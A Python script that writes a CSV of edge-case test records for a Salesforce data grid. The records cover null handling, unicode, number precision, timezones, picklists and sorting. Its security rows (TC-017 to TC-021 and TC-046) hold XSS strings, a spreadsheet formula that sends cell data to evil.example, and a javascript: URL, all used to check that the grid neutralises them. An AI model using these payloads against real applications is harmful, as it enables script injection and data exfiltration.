#!/usr/bin/env python3
"""
Rowhouse — edge-case seed data generator.

Writes Rowhouse_Test_Record__c.csv. Every row exists to break one specific
thing; Test_Case__c names it and Expected__c says what correct looks like, so a
failing test tells you which edge case broke without reading this file.

Written with the csv module on purpose: several values contain commas, quotes,
newlines and leading '=' characters. Hand-written CSV gets those wrong.
"""
import csv, os, sys

OUT = os.path.join(os.path.dirname(__file__), "..", "data", "Rowhouse_Test_Record__c.csv")

COLS = [
    "Name", "Test_Case__c", "Expected__c",
    "Text_Field__c", "Long_Text__c",
    "Number_Field__c", "Decimal_Field__c", "Currency_Field__c", "Percent_Field__c",
    "Date_Field__c", "DateTime_Field__c",
    "Checkbox_Field__c", "Email_Field__c", "Phone_Field__c", "URL_Field__c",
    "Picklist_Field__c", "Controlling_Picklist__c", "Dependent_Picklist__c",
    "Multi_Picklist__c",
]

R = []
def rec(name, tc, expected, **kw):
    row = {c: "" for c in COLS}
    row.update(Name=name, Test_Case__c=tc, Expected__c=expected, **kw)
    R.append(row)

# ---------------------------------------------------------------- null vs empty
rec("TC-001 all nulls", "TC-001 null vs empty string",
    "Every cell renders as empty with no placeholder text. Editing then cancelling "
    "must leave the field null, not convert it to an empty string.")
rec("TC-002 empty strings", "TC-002 empty string is not null",
    "Renders identically to TC-001, but a save must not change these to null. "
    "Salesforce treats '' and null differently and a grid must not conflate them.",
    Text_Field__c="", Long_Text__c="")
rec("TC-003 zero values", "TC-003 zero is not blank",
    "0, 0.00 and 0% must render as '0', '0.00' and '0.00%' — never blank. "
    "Falsy-check bugs show up here first.",
    Number_Field__c="0", Decimal_Field__c="0.00", Currency_Field__c="0.00",
    Percent_Field__c="0", Checkbox_Field__c="false")

# ---------------------------------------------------------------- text handling
rec("TC-004 leading zeros", "TC-004 leading zeros preserved",
    "Must render and CSV-export as 00123, not 123. Text fields that look numeric "
    "are the most common export regression.",
    Text_Field__c="00123")
rec("TC-005 whitespace", "TC-005 leading and trailing whitespace",
    "Whitespace is visible on edit and preserved on save. Do not trim silently — "
    "the platform trims some field types and not others.",
    Text_Field__c="  padded both sides  ")
rec("TC-006 comma", "TC-006 comma inside a value",
    "Renders with the comma. CSV export must quote the field.",
    Text_Field__c="Smith, John and Sons, Ltd.")
rec("TC-007 double quote", "TC-007 double quote inside a value",
    'Renders as typed. CSV export must escape it by doubling: "" .',
    Text_Field__c='She said "yes" twice')
rec("TC-008 newline", "TC-008 newline inside a long text value",
    "Grid cell shows it on one line (clipped or wrapped per config), never breaks "
    "the row. CSV export must quote so the record stays one row on re-import.",
    Text_Field__c="line one",
    Long_Text__c="First line.\nSecond line.\n\nFourth line after a blank.")
rec("TC-009 tab character", "TC-009 tab inside a value",
    "Preserved, and must not be interpreted as a column separator by TSV export.",
    Text_Field__c="before\tafter")
rec("TC-010 255 chars", "TC-010 text field at exactly its 255 limit",
    "Saves without error. Truncation indicator appears but no data is lost.",
    Text_Field__c="A" * 255)
rec("TC-011 long unbroken", "TC-011 long word with no spaces",
    "Must not blow out the column width or force horizontal scroll of the whole "
    "table. Truncates with slds-truncate.",
    Text_Field__c="Lorem" + "ipsum" * 40)

# ---------------------------------------------------------------- unicode
rec("TC-012 emoji", "TC-012 emoji and surrogate pairs",
    "Renders as one glyph each. Any character counting must use code points, not "
    "UTF-16 length, or the character counter reads double.",
    Text_Field__c="Grid test 🧱🏘️👷🏽‍♀️ done")
rec("TC-013 RTL", "TC-013 right-to-left text",
    "Renders right-to-left inside a left-to-right table without reordering "
    "neighbouring columns. Arrow-key direction constants must invert under RTL.",
    Text_Field__c="مرحبا بالعالم — شبكة")
rec("TC-014 CJK", "TC-014 double-width CJK characters",
    "Column auto-width must account for double-width glyphs. A width computed "
    "from character count will be roughly half what it needs.",
    Text_Field__c="日本語のテキスト、全角文字の幅")
rec("TC-015 combining", "TC-015 combining diacritics",
    "e + combining acute must render as one grapheme and must not be truncated "
    "between the base character and the mark.",
    Text_Field__c="café résumé naïve")
rec("TC-016 zero width", "TC-016 zero-width and non-breaking characters",
    "Zero-width space and non-breaking space are preserved but must not render as "
    "visible boxes. A value that looks empty but is not.",
    Text_Field__c="a​b c")

# ---------------------------------------------------------------- injection
rec("TC-017 script tag", "TC-017 HTML and script content renders as text",
    "SECURITY. Must render as literal text. If an alert fires or the markup is "
    "interpreted, the grid has an XSS hole. Test in both display and edit mode.",
    Text_Field__c='<script>alert("xss")</script><b>bold?</b>')
rec("TC-018 img onerror", "TC-018 attribute-break XSS attempt",
    "SECURITY. Renders as literal text. Covers the case where a value is "
    "interpolated into an attribute rather than a text node.",
    Text_Field__c='"><img src=x onerror=alert(1)>')
rec("TC-019 csv formula", "TC-019 CSV formula injection",
    "SECURITY. On CSV export, a value beginning = + - or @ must be neutralised "
    "(prefix with a tab or single quote) so Excel does not execute it on open. "
    "Easy to miss and a real exfiltration vector.",
    Text_Field__c='=HYPERLINK("http://evil.example/?"&A1,"click")')
rec("TC-020 csv formula plus", "TC-020 CSV formula injection, other prefixes",
    "SECURITY. Same treatment as TC-019 for +, - and @ prefixes.",
    Text_Field__c="+1234567890", Long_Text__c="@SUM(A1:A9)")
rec("TC-021 soql injection", "TC-021 quote and backslash in a filterable value",
    "SECURITY. Quick search for this value must not error and must not alter the "
    "query. Proves the search term is bound, not concatenated.",
    Text_Field__c="O'Brien \\ \"quoted\" %wildcard%_")

# ---------------------------------------------------------------- numbers
rec("TC-022 negatives", "TC-022 negative numbers and currency",
    "Negative currency renders per locale (-$1,234.56 or ($1,234.56)) and sorts "
    "below zero, not by absolute value.",
    Number_Field__c="-42", Decimal_Field__c="-1234.56",
    Currency_Field__c="-1234.56", Percent_Field__c="-12.5")
rec("TC-023 precision", "TC-023 value with more precision than field scale",
    "Field is scale 2. Input of 3 decimal places must round consistently on both "
    "client and server — and must not show 1234.56 while saving 1234.567.",
    Decimal_Field__c="1234.567", Currency_Field__c="0.005")
rec("TC-024 large number", "TC-024 large number near the 18-digit limit",
    "Renders without switching to exponential notation and without JavaScript "
    "float rounding. 18 significant digits exceeds Number.MAX_SAFE_INTEGER, so "
    "the value must be carried as a string client-side.",
    Number_Field__c="999999999999999999")
rec("TC-025 percent semantics", "TC-025 percent stored value versus displayed",
    "Salesforce stores 50 for 50%. The editor must round-trip without dividing or "
    "multiplying by 100 — the classic percent bug.",
    Percent_Field__c="50")
rec("TC-026 thousands", "TC-026 locale thousands separator on edit",
    "Displays 1,234,567.89; the edit input must accept both 1234567.89 and the "
    "grouped form without rejecting either.",
    Decimal_Field__c="1234567.89", Currency_Field__c="1234567.89")

# ---------------------------------------------------------------- dates
rec("TC-027 date new year", "TC-027 Date field on 1 January",
    "A Date has no timezone. Must render as 2026-01-01 for a user in Auckland and "
    "a user in Los Angeles. If it shifts a day, the code is treating it as a "
    "DateTime.",
    Date_Field__c="2026-01-01")
rec("TC-028 date new year eve", "TC-028 Date field on 31 December",
    "Same as TC-027 in the other direction — the day must not roll forward.",
    Date_Field__c="2026-12-31")
rec("TC-029 datetime late", "TC-029 DateTime at 23:30 on a month end",
    "Renders in the running user's timezone. Editing the time must not silently "
    "change the date unless the user crosses midnight deliberately.",
    DateTime_Field__c="2026-01-31T23:30:00.000Z")
rec("TC-030 dst spring us", "TC-030 US DST spring-forward gap",
    "02:30 on 8 March 2026 does not exist in America/New_York. Must not throw, "
    "and must not silently become 01:30.",
    DateTime_Field__c="2026-03-08T07:30:00.000Z")
rec("TC-031 dst autumn eu", "TC-031 EU DST fall-back ambiguity",
    "02:30 on 25 October 2026 occurs twice in Europe/London. Must round-trip to "
    "the same instant it was saved as.",
    DateTime_Field__c="2026-10-25T01:30:00.000Z")
rec("TC-032 leap day", "TC-032 leap day",
    "29 February 2028 is valid. Date arithmetic in fill-down must not skip it.",
    Date_Field__c="2028-02-29")
rec("TC-033 date range low", "TC-033 earliest valid Salesforce date",
    "1700-01-01 is the documented floor. Renders and sorts correctly rather than "
    "being treated as invalid.",
    Date_Field__c="1700-01-01")
rec("TC-034 date range high", "TC-034 latest valid Salesforce date",
    "4000-12-31 is the documented ceiling. Must not overflow a 4-digit year "
    "assumption.",
    Date_Field__c="4000-12-31")

# ---------------------------------------------------------------- picklists
rec("TC-035 picklist valid", "TC-035 picklist with an active value",
    "Combobox opens with Alpha, Beta, Gamma and the current value selected.",
    Picklist_Field__c="Beta")
rec("TC-036 picklist orphan", "TC-036 picklist value no longer in the value set",
    "CRITICAL and common in real orgs. 'Obsolete' is not an active value. Must "
    "render the stored value, must not blank it, and the editor must show it as "
    "the current selection while offering the active values. Silently discarding "
    "it is data loss.",
    Picklist_Field__c="Obsolete")
rec("TC-037 dependent valid", "TC-037 dependent picklist, valid pairing",
    "Controlling = Hardware, so the dependent list offers only Keyboard and "
    "Monitor.",
    Controlling_Picklist__c="Hardware", Dependent_Picklist__c="Keyboard")
rec("TC-038 dependent mismatch", "TC-038 dependent picklist, invalid pairing",
    "Controlling = Software but the stored dependent value belongs to Hardware. "
    "Must render as stored and must not auto-correct on load — only on an "
    "explicit edit of the controlling field.",
    Controlling_Picklist__c="Software", Dependent_Picklist__c="Monitor")
rec("TC-039 dependent empty", "TC-039 controlling value with no valid dependents",
    "Controlling = Services has no dependent values configured. The dependent "
    "editor must render disabled and empty, not throw.",
    Controlling_Picklist__c="Services")
rec("TC-040 multi picklist", "TC-040 multi-select picklist round-trip",
    "Stored semicolon-delimited. Must render as separate chips or a comma list, "
    "and must save back semicolon-delimited in the original order.",
    Multi_Picklist__c="Red;Green;Blue")
rec("TC-041 multi picklist one", "TC-041 multi-select with a single value",
    "Must not render a trailing separator, and must not be confused with a plain "
    "picklist.",
    Multi_Picklist__c="Green")

# ---------------------------------------------------------------- other types
rec("TC-042 checkbox true", "TC-042 checkbox true",
    "Renders checked. A checkbox is never null in Salesforce — if the grid can "
    "produce a null checkbox, that is a bug.",
    Checkbox_Field__c="true")
rec("TC-043 email invalid shape", "TC-043 email that is stored but unusual",
    "Salesforce accepts plus-addressing and long TLDs. The editor must not reject "
    "a value the platform already accepted.",
    Email_Field__c="grid.test+v0.1@rowhouse.example")
rec("TC-044 phone formats", "TC-044 phone with extension and punctuation",
    "Phone is free text in Salesforce. Must not be reformatted or rejected.",
    Phone_Field__c="+1 (555) 010-9999 x4021")
rec("TC-045 url long", "TC-045 URL with query string and fragment",
    "Renders as a link with the display text truncated, but the href carries the "
    "full URL including the query string.",
    URL_Field__c="https://example.com/a/very/long/path?query=1&other=2#fragment-name")
rec("TC-046 url javascript", "TC-046 URL field containing a javascript scheme",
    "SECURITY. Must not render as a clickable javascript: link. Render as text or "
    "strip the href.",
    URL_Field__c="javascript:alert(document.domain)")

# ---------------------------------------------------------------- identity/keys
rec("TC-047 duplicate content A", "TC-047 two records with identical field values",
    "Paired with TC-048. Row keys must stay distinct because they derive from Id, "
    "not from content. If they collide, the renderer will reuse the wrong row on "
    "sort and edits will land on the wrong record.",
    Text_Field__c="identical", Number_Field__c="7")
rec("TC-048 duplicate content B", "TC-048 two records with identical field values",
    "Paired with TC-047. Edit one and assert the other is untouched.",
    Text_Field__c="identical", Number_Field__c="7")

# ---------------------------------------------------------------- sort ordering
for i, (label, txt, num) in enumerate([
    ("TC-049 sort null", "", ""),
    ("TC-050 sort lower", "apple", "1"),
    ("TC-051 sort upper", "Apple", "2"),
    ("TC-052 sort accent", "Äpple", "3"),
    ("TC-053 sort numeric str", "10", "10"),
    ("TC-054 sort numeric str 2", "9", "9"),
], 1):
    rec(label, label + " collation and null ordering",
        "Sorting these six together must be deterministic and must match the "
        "documented rule: nulls last on ascending, case-insensitive collation, "
        "accents after their base letter, and text '10' before '9' while the "
        "numeric column sorts 9 before 10.",
        Text_Field__c=txt, Number_Field__c=num)

# ---------------------------------------------------------------- long text
rec("TC-055 long text large", "TC-055 long text area near its limit",
    "32,000 characters. Must not be loaded in full into the grid cell — the grid "
    "should request a truncated projection and fetch the rest only on edit. If "
    "the whole value ships to the client, 1,000 such rows is 32 MB.",
    Long_Text__c=("Paragraph of filler text for the long text area boundary test. " * 520)[:32000])

# ---------------------------------------------------------------- wide row
rec("TC-056 every field populated", "TC-056 all fields populated at once",
    "The widest realistic row. Used for the column-count ceiling test and for "
    "measuring render cost per row with every editor instantiated.",
    Text_Field__c="All fields populated", Long_Text__c="Short.",
    Number_Field__c="1234", Decimal_Field__c="99.99", Currency_Field__c="4999.00",
    Percent_Field__c="33.33", Date_Field__c="2026-06-15",
    DateTime_Field__c="2026-06-15T14:45:00.000Z", Checkbox_Field__c="true",
    Email_Field__c="wide.row@rowhouse.example", Phone_Field__c="555-0100",
    URL_Field__c="https://rowhouse.example/wide", Picklist_Field__c="Gamma",
    Controlling_Picklist__c="Hardware", Dependent_Picklist__c="Monitor",
    Multi_Picklist__c="Red;Blue")

def main():
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    with open(OUT, "w", newline="", encoding="utf-8") as f:
        w = csv.DictWriter(f, fieldnames=COLS, quoting=csv.QUOTE_MINIMAL)
        w.writeheader()
        w.writerows(R)
    print(f"wrote {len(R)} records to {os.path.relpath(OUT)}")
    cases = sorted({r['Test_Case__c'].split()[0] for r in R})
    print(f"test cases TC-001..{cases[-1].split('-')[1]}, {len(cases)} distinct")

if __name__ == "__main__":
    main()
